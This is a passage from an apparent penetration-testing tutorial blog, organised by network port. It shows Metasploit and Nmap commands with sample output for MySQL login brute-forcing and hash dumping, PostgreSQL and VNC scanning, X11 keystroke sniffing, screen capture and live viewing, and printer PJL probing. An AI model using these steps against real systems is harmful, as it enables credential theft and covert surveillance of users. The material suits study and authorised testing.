</span><span class='line'>iface.ipv6_autocfg = &lt;empty&gt;
</span><span class='line'>iface.linklocal_autocfg = &lt;empty&gt;
</span><span class='line'>iface.router_autocfg = &lt;empty&gt;
</span><span class='line'>iface.ipv6_linklocal = &lt;empty&gt;
</span><span class='line'>iface.ipv6_router = &lt;empty&gt;
</span><span class='line'>iface.state = &lt;empty&gt;
</span><span class='line'>iface.vlan_id = 0
</span><span class='line'>iface.vlan_priority = 0
</span><span class='line'>iface.vlan_state = &lt;empty&gt;
</span><span class='line'>iface.iface_num = 0
</span><span class='line'>iface.mtu = 0
</span><span class='line'>iface.port = 0
</span><span class='line'>node.discovery_address = 192.168.xx.xx
</span><span class='line'>node.discovery_port = 3260
</span><span class='line'>node.discovery_type = send_targets
</span><span class='line'>node.session.initial_cmdsn = 0
</span><span class='line'>node.session.initial_login_retry_max = 8
</span><span class='line'>node.session.xmit_thread_priority = -20
</span><span class='line'>node.session.cmds_max = 128
</span><span class='line'>node.session.queue_depth = 32
</span><span class='line'>node.session.nr_sessions = 1
</span><span class='line'>node.session.auth.authmethod = None
</span><span class='line'>node.session.auth.username = &lt;empty&gt;
</span><span class='line'>node.session.auth.password = &lt;empty&gt;
</span><span class='line'>node.session.auth.username_in = &lt;empty&gt;
</span><span class='line'>node.session.auth.password_in = &lt;empty&gt;
</span><span class='line'>node.session.timeo.replacement_timeout = 120
</span><span class='line'>node.session.err_timeo.abort_timeout = 15
</span><span class='line'>node.session.err_timeo.lu_reset_timeout = 30
</span><span class='line'>node.session.err_timeo.tgt_reset_timeout = 30
</span><span class='line'>node.session.err_timeo.host_reset_timeout = 60
</span><span class='line'>node.session.iscsi.FastAbort = Yes
</span><span class='line'>node.session.iscsi.InitialR2T = No
</span><span class='line'>node.session.iscsi.ImmediateData = Yes
</span><span class='line'>node.session.iscsi.FirstBurstLength = 262144
</span><span class='line'>node.session.iscsi.MaxBurstLength = 16776192
</span><span class='line'>node.session.iscsi.DefaultTime2Retain = 0
</span><span class='line'>node.session.iscsi.DefaultTime2Wait = 2
</span><span class='line'>node.session.iscsi.MaxConnections = 1
</span><span class='line'>node.session.iscsi.MaxOutstandingR2T = 1
</span><span class='line'>node.session.iscsi.ERL = 0
</span><span class='line'>node.conn[0].address = 192.168.xx.xx
</span><span class='line'>node.conn[0].port = 3260
</span><span class='line'>node.conn[0].startup = manual
</span><span class='line'>node.conn[0].tcp.window_size = 524288
</span><span class='line'>node.conn[0].tcp.type_of_service = 0
</span><span class='line'>node.conn[0].timeo.logout_timeout = 15
</span><span class='line'>node.conn[0].timeo.login_timeout = 15
</span><span class='line'>node.conn[0].timeo.auth_timeout = 45
</span><span class='line'>node.conn[0].timeo.noop_out_interval = 5
</span><span class='line'>node.conn[0].timeo.noop_out_timeout = 5
</span><span class='line'>node.conn[0].iscsi.MaxXmitDataSegmentLength = 0
</span><span class='line'>node.conn[0].iscsi.MaxRecvDataSegmentLength = 262144
</span><span class='line'>node.conn[0].iscsi.HeaderDigest = None
</span><span class='line'>node.conn[0].iscsi.DataDigest = None
</span><span class='line'>node.conn[0].iscsi.IFMarker = No
</span><span class='line'>node.conn[0].iscsi.OFMarker = No
</span><span class='line'># END RECORD
</span></code></pre></td></tr></table></div></figure></li>
</ol></p>

<h3>MySQL | Port 3306</h3>

<p><strong>Metasploit</strong> has</p>

<p><ol>
<li><strong>MySQL Server Version Enumeration</strong> : Enumerates the version of MySQL servers
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mysql/mysql_version
</span><span class='line'>services -p 3306 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[<em>] 10.7.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)
</span><span class='line'>[</em>] Scanned  5 of 44 hosts (11% complete)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.5.35-0ubuntu0.12.04.2 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.0.95 (protocol 10)
</span><span class='line'>[<em>] Scanned  9 of 44 hosts (20% complete)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MariaDB server
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[<em>] Scanned 14 of 44 hosts (31% complete)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
</span><span class='line'>[</em>] Scanned 18 of 44 hosts (40% complete)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.6.17 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.1.50-community (protocol 10)</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>MySQL Login Utility</strong> to validate login or bruteforce logins. This module simply queries the MySQL instance for a specific user/pass (default is root with blank)</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mysql/mysql_login
</span><span class='line'>services -p 3306 -u -R
</span><span class='line'>set username root
</span><span class='line'>set password example@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[<em>] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50
</span><span class='line'>[+] 10.10.xx.xx:3306 MYSQL - Success: &lsquo;root:example@123&rsquo;
</span><span class='line'>[</em>] Scanned 22 of 44 hosts (50% complete)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50
</span><span class='line'>[+] 10.10.xx.xx:3306 MYSQL - Success: &lsquo;root:example@123&rsquo;
</span><span class='line'>[-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.
</span><span class='line'>[-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.
</span><span class='line'>[</em>] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.6.15
</span><span class='line'>[-] 10.10.xx.xx:3306 MYSQL - LOGIN FAILED: root:example@123 (Incorrect: </span></code></pre></td></tr></table></div></figure>
</li>
<li>Once we have to username passsword for the root we can use <strong>MYSQL Password Hashdump</strong> to extract the usernames and encrypted password hashes from a MySQL server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mysql/mysql_hashdump
</span><span class='line'>creds -p 3306 -t password -u root -R
</span><span class='line'>set username root
</span><span class='line'>set password example@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[-] MySQL Error: RbMysql::HandshakeError Bad handshake
</span><span class='line'>[-] There was an error reading the MySQL User Table
</span><span class='line'>[<em>] Scanned 4 of 6 hosts (66% complete)
</span><span class='line'>[+] Saving HashString as Loot: root:</em>6FE073B02F77230C092415032F0FF0951FXXXXXX
</span><span class='line'>[+] Saving HashString as Loot: wordpress:<em>A31B8F449706C32558ABC788DDABF62DCCXXXXXX
</span><span class='line'>[+] Saving HashString as Loot: root:</em>6FE073B02F77230C092415032F0FF0951FXXXXXX
</span><span class='line'>[<em>] Scanned 5 of 6 hosts (83% complete)
</span><span class='line'>[+] Saving HashString as Loot: newsgroupdbo:</em>6FE073B02F77230C092415032F0FF0951FXXXXXX
</span><span class='line'>[+] Saving HashString as Loot: intiadda:<em>6FE073B02F77230C092415032F0FF0951XXXXXX
</span><span class='line'>[+] Saving HashString as Loot: newsgroupdbo:</em>6FE073B02F77230C092415032F0FF0951FXXXXXX</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p>Once we have the username and password, we can use
<ol>
<li><strong>mysql utility</strong> to login in to the server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql -u root -p -h 10.10.xx.xx</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p>Explore UDF functionality and vulnerablity!!</p>

<h3>Postgresql | Port 5432</h3>

<p><strong>Metasploit</strong> has
<ol>
<li><strong>PostgreSQL Version Probe</strong> : Enumerates the verion of PostgreSQL servers.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/postgres/postgres_version</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>PostgreSQL Login Utility</strong>: This module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE,
  PASS_FILE, and USERPASS_FILE options.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/postgres/postgres_login</span></code></pre></td></tr></table></div></figure></li>
<li><strong>PostgreSQL Database Name Command Line Flag Injection</strong>: identify PostgreSQL 9.0, 9.1, and 9.2 servers that are vulnerable to command-line flag injection through CVE-2013-1899. This can lead to denial of service, privilege escalation, or even arbitrary code execution
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/postgres/postgres_dbname_flag_injection</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<h3>VNC | Port 5900</h3>

<p>We always find openVNCs in an engagement.</p>

<p><strong>Metasploit</strong> has
<ol>
<li><strong>VNC Authentication None Detection</strong>: Detect VNC servers that support the &ldquo;None&rdquo; authentication method.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/vnc/vnc_none_auth</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>VNC Authentication Scanner</strong>:   This module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/vnc/vnc_login</span></code></pre></td></tr></table></div></figure></li>
</ol></p>

<h3>X11 | Port 6000</h3>

<p>We do also find a lot of open X11 servers, we can use x11 to find the keyboard strokes and screenshots.</p>

<p><strong>Metasploit</strong> has
<ol>
<li>
<strong>X11 No-Auth Scanner</strong>: This module scans for X11 servers that allow anyone to connect without authentication.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auxiliary/scanner/x11/open_x11
</span><span class='line'>services -p 6000 -u -R</span></code></pre></td></tr></table></div></figure>
Sample output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[<em>] 10.9.xx.xx Access Denied
</span><span class='line'>[</em>] 10.9.xx.xx Open X Server (The XFree86 Project, Inc)
</span><span class='line'>
</span><span class='line'>[<em>] Scanned  5 of 45 hosts (11% complete)
</span><span class='line'>[-] No response received due to a timeout
</span><span class='line'>[</em>] 10.10.xx.xx Access Denied
</span><span class='line'>[<em>] Scanned  9 of 45 hosts (20% complete)
</span><span class='line'>[</em>] 10.11.xx.xx Access Denied
</span><span class='line'>[<em>] Scanned 14 of 45 hosts (31% complete)
</span><span class='line'>[</em>] 10.15.xx.xx Access Denied
</span><span class='line'>[<em>] Scanned 18 of 45 hosts (40% complete)
</span><span class='line'>[</em>] 10.19.xx.xx Access Denied
</span><span class='line'>[<em>] Scanned 23 of 45 hosts (51% complete)
</span><span class='line'>[</em>] Scanned 27 of 45 hosts (60% complete)
</span><span class='line'>[<em>] Scanned 32 of 45 hosts (71% complete)
</span><span class='line'>[</em>] 10.20.xx.xx Open X Server (Xfree86-Heidenhain-Project)
</span><span class='line'>[<em>] Scanned 36 of 45 hosts (80% complete)
</span><span class='line'>[</em>] Scanned 41 of 45 hosts (91% complete)
</span><span class='line'>[<em>] 10.87.xx.xx Access Denied
</span><span class='line'>[</em>] Scanned 45 of 45 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p>We can use
<ol>
<li><a href="http://tools.kali.org/sniffingspoofing/xspy">xspy</a> to sniff the keyboard keystrokes.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xspy 10.9.xx.xx
</span><span class='line'>
</span><span class='line'>opened 10.9.xx.xx:0 for snoopng
</span><span class='line'>swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
</span><span class='line'>qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>We can also use x11 to grab <strong>screenshots or live videos</strong> of the user. We need to  verify the connection is open and we can get to it:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xdpyinfo -display &lt;ip&gt;:&lt;display&gt;</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xdpyinfo -display 10.20.xx.xx:0
</span><span class='line'>name of display:    10.20.xx.xx:0
</span><span class='line'>version number:    11.0
</span><span class='line'>vendor string:    Xfree86-Heidenhain-Project
</span><span class='line'>vendor release number:    0
</span><span class='line'>maximum request size:  262140 bytes
</span><span class='line'>motion buffer size:  0
</span><span class='line'>bitmap unit, bit order, padding:    32, LSBFirst, 32
</span><span class='line'>image byte order:    LSBFirst
</span><span class='line'>number of supported pixmap formats:    6
</span><span class='line'>supported pixmap formats:
</span><span class='line'>    depth 1, bits_per_pixel 1, scanline_pad 32
</span><span class='line'>    depth 4, bits_per_pixel 8, scanline_pad 32
</span><span class='line'>    depth 8, bits_per_pixel 8, scanline_pad 32
</span><span class='line'>    depth 15, bits_per_pixel 16, scanline_pad 32
</span><span class='line'>    depth 16, bits_per_pixel 16, scanline_pad 32
</span><span class='line'>    depth 24, bits_per_pixel 32, scanline_pad 32
</span><span class='line'>keycode range:    minimum 8, maximum 255
</span><span class='line'>focus:  window 0x600005, revert to Parent
</span><span class='line'>number of extensions:    11
</span><span class='line'>    FontCache
</span><span class='line'>    MIT-SCREEN-SAVER
</span><span class='line'>    MIT-SHM
</span><span class='line'>    RECORD
</span><span class='line'>    SECURITY
</span><span class='line'>    SHAPE
</span><span class='line'>    XC-MISC
</span><span class='line'>    XFree86-DGA
</span><span class='line'>    XFree86-VidModeExtension
</span><span class='line'>    XInputExtension
</span><span class='line'>    XVideo
</span><span class='line'>default screen number:    0
</span><span class='line'>number of screens:    1
</span><span class='line'>
</span><span class='line'>screen #0:
</span><span class='line'>  dimensions:    1024x768 pixels (347x260 millimeters)
</span><span class='line'>  resolution:    75x75 dots per inch
</span><span class='line'>  depths (6):    16, 1, 4, 8, 15, 24
</span><span class='line'>  root window id:    0x25
</span><span class='line'>  depth of root window:    16 planes
</span><span class='line'>  number of colormaps:    minimum 1, maximum 1
</span><span class='line'>  default colormap:    0x20
</span><span class='line'>  default number of colormap cells:    64
</span><span class='line'>  preallocated pixels:    black 0, white 65535
</span><span class='line'>  options:    backing-store NO, save-unders NO
</span><span class='line'>  largest cursor:    32x32
</span><span class='line'>  current input event mask:    0x0
</span><span class='line'>  number of visuals:    2
</span><span class='line'>  default visual id:  0x21
</span><span class='line'>  visual:
</span><span class='line'>    visual id:    0x21
</span><span class='line'>    class:    TrueColor
</span><span class='line'>    depth:    16 planes
</span><span class='line'>    available colormap entries:    64 per subfield
</span><span class='line'>    red, green, blue masks:    0xf800, 0x7e0, 0x1f
</span><span class='line'>    significant bits in color specification:    6 bits
</span><span class='line'>  visual:
</span><span class='line'>    visual id:    0x22
</span><span class='line'>    class:    DirectColor
</span><span class='line'>    depth:    16 planes
</span><span class='line'>    available colormap entries:    64 per subfield
</span><span class='line'>    red, green, blue masks:    0xf800, 0x7e0, 0x1f
</span><span class='line'>    significant bits in color specification:    6 bits</span></code></pre></td></tr></table></div></figure></p>

<p>To take the <strong>screenshot</strong> use:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xwd -root -display 10.20.xx.xx:0 -out xdump.xdump
</span><span class='line'>display xdump.xdump</span></code></pre></td></tr></table></div></figure>
<strong>live viewing</strong>:
First we need to find the ID of the window using xwininfo
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xwininfo -root -display 10.9.xx.xx:0
</span><span class='line'>
</span><span class='line'>xwininfo: Window id: 0x45 (the root window) (has no name)
</span><span class='line'>
</span><span class='line'>  Absolute upper-left X:  0
</span><span class='line'>  Absolute upper-left Y:  0
</span><span class='line'>  Relative upper-left X:  0
</span><span class='line'>  Relative upper-left Y:  0
</span><span class='line'>  Width: 1024
</span><span class='line'>  Height: 768
</span><span class='line'>  Depth: 16
</span><span class='line'>  Visual: 0x21
</span><span class='line'>  Visual Class: TrueColor
</span><span class='line'>  Border width: 0
</span><span class='line'>  Class: InputOutput
</span><span class='line'>  Colormap: 0x20 (installed)
</span><span class='line'>  Bit Gravity State: ForgetGravity
</span><span class='line'>  Window Gravity State: NorthWestGravity
</span><span class='line'>  Backing Store State: NotUseful
</span><span class='line'>  Save Under State: no
</span><span class='line'>  Map State: IsViewable
</span><span class='line'>  Override Redirect State: no
</span><span class='line'>  Corners:  +0+0  -0+0  -0-0  +0-0
</span><span class='line'>  -geometry 1024x768+0+0</span></code></pre></td></tr></table></div></figure></p>

<p>For <strong>live viewing</strong> we need to use
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
</span><span class='line'>./xwatchwin 10.9.xx.xx:0 -w 0x45</span></code></pre></td></tr></table></div></figure>
</li>
<li> We can also do <strong>X11 Keyboard Command Injection</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use exploit/unix/x11/x11_keyboard_exec</span></code></pre></td></tr></table></div></figure></p>

<p>For more information: Refer: <a href="http://rageweb.info/2014/05/04/open-x11-server/">Open-x11-server</a>
</li>
</ol></p>

<h3>PJL | Port 9100</h3>

<p>There are multiple modules in the metasploit for PJL.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   Name                                             Disclosure Date  Rank    Description
</span><span class='line'>   &mdash;-                                             &mdash;&mdash;&mdash;&mdash;&mdash;  &mdash;-    &mdash;&mdash;&mdash;&ndash;
</span><span class='line'>   auxiliary/scanner/printer/printer_delete_file                     normal  Printer File Deletion Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_download_file                   normal  Printer File Download Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_env_vars                        normal  Printer Environment Variables Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_list_dir                        normal  Printer Directory Listing Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_list_volumes                    normal  Printer Volume Listing Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_ready_message                   normal  Printer Ready Message Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_upload_file                     normal  Printer File Upload Scanner
</span><span class='line'>   auxiliary/scanner/printer/printer_version_info                    normal  Printer Version Information Scanner
</span><span class='line'>   auxiliary/server/capture/printjob_capture                         normal  Printjob Capture Service</span></code></pre></td></tr></table></div></figure>
As of now, We only got a chance to use
<ol>
<li><strong>Printer Version Information Scanner</strong> which scans for printer version information using the Printer Job Language (PJL) protocol.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/printer/printer_version_info</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:9100 - HP LaserJet M1522nf MFP
</span><span class='line'>[<em>] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[</em>] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p><strong>Nmap</strong> also one NSE which is
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/pjl-ready-message.html">PJL-ready-message</a> It retrieves or sets the ready message on printers that support the Printer Job Language. This includes most PostScript printers that listen on port 9100. Without an argument, displays the current ready message. With the pjl_ready_message script argument, displays the old ready message and changes it to the message given.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap &ndash;script=pjl-ready-message.nse -n -p 9100 10.10.xx.xx
</span><span class='line'>
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.14s latency).
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>9100/tcp open  jetdirect
</span><span class='line'>|_pjl-ready-message: &ldquo;Processing&hellip;&rdquo;</span></code></pre></td></tr></table></div></figure>
</li></p>

<p></ol></p>

<h3>Apache Cassandra | Port 9160</h3>

<p>For Apache Cassandra, NMap has two nse script</p>

<p><ol>
<li>
<a href="https://nmap.org/nsedoc/scripts/cassandra-info.html">cassandra-info</a> which attempts to get basic info and server status from a Cassandra database.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
